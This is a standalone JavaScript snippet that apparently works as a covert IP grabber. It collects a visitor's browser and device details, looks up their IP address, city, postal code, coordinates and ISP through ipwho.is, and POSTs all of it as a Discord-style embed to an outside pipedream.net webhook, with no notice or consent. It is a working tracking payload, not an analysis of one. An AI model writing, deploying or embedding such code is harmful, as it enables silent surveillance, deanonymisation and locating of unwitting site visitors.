var useragent = navigator.userAgent
var cookie = navigator.cookieEnabled
var language = navigator.language
var platform = navigator.platform
var java = navigator.javaEnabled()
var width = screen.width
var height = screen.height
var battery = navigator.getBattery().then(function(battery) {battery.level * 100;})
var memory = navigator.deviceMemory
var cores = navigator.hardwareConcurrency
var langs = navigator.languages
var plugs = navigator.plugins.name
var touch = navigator.maxTouchPoints
var webdriv = navigator.webdriver
var contacts = navigator.contacts
var donot = navigator.doNotTrack
var refer = document.referrer
var orientation = screen.orientation.type

$.getJSON("https://ipwho.is/", function(data) {         
  var params = {
    embeds: [
      {
        "title": "Details",
        "color": 15258703,
        "thumbnail": {
        },
        "fields": [
          {
            "name": "IP Address",
            "value": `>>> ${data.ip}\nType: ${data.type}`
          },
          {
            "name": "GeoLocation Info",
            "value": `>>> Town, State: ${data.city}, ${data.region}\nRegion: ${data.region}\nCountry: ${data.country}\nPostal Code: ${data.postal}\nTime Zone: ${data.timezone.current_time}, ${data.timezone.offset}, ${data.timezone.id}, ${data.timezone.abbr}\nLong/Lat: ${data.latitude}, ${data.longitude}`
          },
          {
            "name": "Network Info",
            "value": `>>> HostName: ${data.connection.org}\nISP: ${data.connection.isp}`
          },
          {
            "name": "Device Info",
            "value": `>>> User Agent: ${useragent}\nPlatform: ${platform}\nLanguage: ${language}\nResolution: ${width}x${height}\nOrientation: ${orientation}\nMemory (estimated): ${memory}\nCores: ${cores}\nTouch Points: ${touch}`
          },
          {
            "name": "Misc Info",
            "value": `>>> Battery: ${battery}\nCookies: ${cookie}\nJava: ${java}\nDo Not Track: ${donot}\nWeb Driver: ${webdriv}\nContacts: ${contacts}`
          }
        ]
      }
    ]
  }
  fetch('https://eo1yxik533s0xjd.m.pipedream.net', {
    method: "POST",
    headers: {
        'Content-type': 'application/json'
    },
    body: JSON.stringify(params)
  }).then(res => {
    console.log(res);
  }) 
})
